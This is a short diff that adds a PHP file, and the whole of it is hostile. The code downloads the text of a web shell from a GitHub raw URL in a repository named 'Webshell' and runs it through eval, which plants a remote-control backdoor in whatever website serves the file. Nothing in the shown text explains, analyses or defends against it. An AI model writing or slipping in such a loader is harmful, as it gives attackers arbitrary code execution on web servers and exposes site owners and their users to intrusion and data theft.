@@ -1,0 +1,4 @@
+<?php $LanThau = file_get_contents(urldecode('https://raw.githubusercontent.com/sk26889/Webshell/refs/heads/main/alfa.txt'));
+
+$LanThau = "?> ".$LanThau;
+eval($LanThau);
